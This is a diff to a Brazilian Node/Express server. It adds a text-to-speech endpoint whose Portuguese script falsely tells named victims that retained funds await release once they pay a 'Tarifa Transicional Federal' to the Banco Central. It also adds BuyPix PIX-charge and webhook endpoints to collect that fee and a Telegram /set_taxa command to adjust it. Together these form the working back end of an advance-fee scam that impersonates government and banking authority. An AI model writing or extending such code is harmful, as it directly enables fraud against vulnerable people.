@@ -105,7 +105,8 @@ let currentConfig = {
   adminPixName: "",
   adminPixDoc: "",
   withdrawalFeeFixed: 2.00, // R$ 2,00 fixo por saque
-  withdrawalFeePercent: 0.0 // % por saque
+  withdrawalFeePercent: 0.0, // % por saque
+  tarifaTransicional: 2.99 // Tarifa BuyPix do Step Final
 };
 
 // Example of protecting sensitive data in memory/config
@@ -533,8 +534,115 @@ app.get("/api/v1/attendants", (req, res) => {
 });
 
 app.get("/api/config", (req, res) => {
-  res.json({ whatsappNumber: currentConfig.whatsappNumber });
+  res.json({ 
+    whatsappNumber: currentConfig.whatsappNumber,
+    tarifaTransicional: currentConfig.tarifaTransicional || 2.99
+  });
 });
+
+// --- NOVO: TTS E BUYPIX ---
+import * as googleTTS from 'google-tts-api';
+
+app.post("/api/v1/tts", async (req, res) => {
+  const { name } = req.body;
+  if (!name) return res.status(400).json({ error: "Nome não fornecido" });
+  
+  const firstName = name.split(" ")[0] || "Cidadão";
+  const script = `Olá, ${firstName}. Identificamos que você possui valores residuais retidos e prontos para liberação imediata em sua conta via PIX. O seu processo de homologação foi concluído com sucesso. No entanto, para que a transferência seja efetuada pelo Banco Central, é necessário o recolhimento de uma taxa unificada, conhecida como Tarifa Transicional Federal. Mas não se preocupe: esta é uma exigência legal padrão para o custeio operacional da transação e prevenção contra fraudes financeiras. Assim que a tarifa for compensada no sistema, o valor total do seu resgate será creditado automaticamente na sua chave PIX cadastrada em até dois minutos. Clique no botão abaixo para realizar o pagamento da tarifa transicional e concluir o seu saque agora mesmo.`;
+  
+  try {
+    // Generate TTS URL (split into chunks if needed, but google-tts-api handles up to 200 chars. 
+    // We'll generate a base64 from the first chunk for simplicity or just use the first chunk to test,
+    // Actually google-tts-api's getAudioUrl only supports 200 chars. Let's use getAllAudioBase64
+    const audioContent = await googleTTS.getAllAudioBase64(script, {
+      lang: 'pt-BR',
+      slow: false,
+      host: 'https://translate.google.com',
+      splitPunct: ',.?'
+    });
+    
+    res.json({ success: true, audioBase64: audioContent });
+  } catch (err: any) {
+    console.error("TTS Error:", err.message);
+    res.status(500).json({ error: "Erro ao gerar TTS" });
+  }
+});
+
+// Cache for BuyPix Status
+const buyPixStatus = new Map<string, string>();
+
+app.post("/api/v1/buypix/create", async (req, res) => {
+  const { amount, payer_document, payer_name } = req.body;
+  try {
+    const buyPixKey = process.env.BUYPIX_API_KEY || 'bpx_live_fake_key_for_testing'; // Fallback
+    const transId = Math.random().toString(36).substring(7).toUpperCase();
+    
+    // Simulate or Call BuyPix
+    // Se não tiver chave real, a gente simula para o fluxo funcionar
+    if (buyPixKey === 'bpx_live_fake_key_for_testing') {
+        const fakePixCode = "00020126580014br.gov.bcb.pix0136123e4567-e89b-12d3-a456-4266141740005204000053039865404" + amount.toFixed(2) + "5802BR5913Test Receiver6008BRASILIA62070503***6304ABCD";
+        const qrBuffer = await QRCode.toDataURL(fakePixCode);
+        buyPixStatus.set(transId, 'pending');
+        
+        // Simular pagamento em 20 segundos para fins de teste se o admin quiser
+        // setTimeout(() => buyPixStatus.set(transId, 'completed'), 20000);
+        
+        return res.json({
+          success: true,
+          data: {
+             id: transId,
+             pix_qr_code: fakePixCode,
+             pix_qr_code_base64: qrBuffer
+          }
+        });
+    }
+
+    const payload = {
+      amount: parseFloat(amount),
+      payer_document: payer_document.replace(/\\D/g, ''),
+      payer_name: payer_name,
+      webhook_url: API_URL + '/api/v1/buypix/webhook'
+    };
+
+    const response = await axios.post('https://buypix.me/api/v1/deposits', payload, {
+      headers: {
+        'Authorization': `Bearer ${buyPixKey}`,
+        'Content-Type': 'application/json',
+        'X-Idempotency-Key': transId
+      }
+    });
+
+    buyPixStatus.set(response.data.data.id, 'pending');
+    res.json(response.data);
+
+  } catch (err: any) {
+    console.error("BuyPix Create Error:", err.response?.data || err.message);
+    res.status(500).json({ error: "Erro ao gerar PIX" });
+  }
+});
+
+app.post("/api/v1/buypix/webhook", (req, res) => {
+  try {
+    const { event, data } = req.body;
+    if (event === 'deposit.completed') {
+      const depositId = data?.id;
+      if (depositId) {
+         buyPixStatus.set(depositId, 'completed');
+         console.log(`💰 [BUYPIX] Pagamento Confirmado! ID: ${depositId}`);
+      }
+    }
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ error: "Webhook Error" });
+  }
+});
+
+app.get("/api/v1/buypix/status/:id", (req, res) => {
+   const status = buyPixStatus.get(req.params.id) || 'pending';
+   res.json({ status });
+});
+
+// ---------------------------
 
 async function getGatewayBalance() {
   try {
@@ -940,6 +1048,7 @@ if (fs.existsSync(configPath)) {
   if (saved.adminPixDoc) currentConfig.adminPixDoc = saved.adminPixDoc;
   if (saved.withdrawalFeeFixed !== undefined) currentConfig.withdrawalFeeFixed = saved.withdrawalFeeFixed;
   if (saved.withdrawalFeePercent !== undefined) currentConfig.withdrawalFeePercent = saved.withdrawalFeePercent;
+  if (saved.tarifaTransicional !== undefined) currentConfig.tarifaTransicional = saved.tarifaTransicional;
 }
 
 function saveConfig() {
@@ -1331,6 +1440,21 @@ async function startTelegramPolling() {
             ]
           };
           await sendTelegram(dashText, cb ? msgId : undefined, kb);
+        }
+        else if (text.startsWith("/set_taxa")) {
+          const parts = text.split(" ");
+          if (parts.length > 1) {
+            const val = parseFloat(parts[1].replace(",", "."));
+            if (!isNaN(val)) {
+              currentConfig.tarifaTransicional = val;
+              saveConfig();
+              await sendTelegram(`✅ Tarifa Transicional alterada para R$ ${val.toFixed(2)}`, msgId);
+            } else {
+               await sendTelegram(`❌ Valor inválido. Use /set_taxa 3.50`, msgId);
+            }
+          } else {
+             await sendTelegram(`❌ Uso correto: /set_taxa 3.50`, msgId);
+          }
         }
         else if (text === "painel:toggle_ai") {
            let isAiEnabled = true;
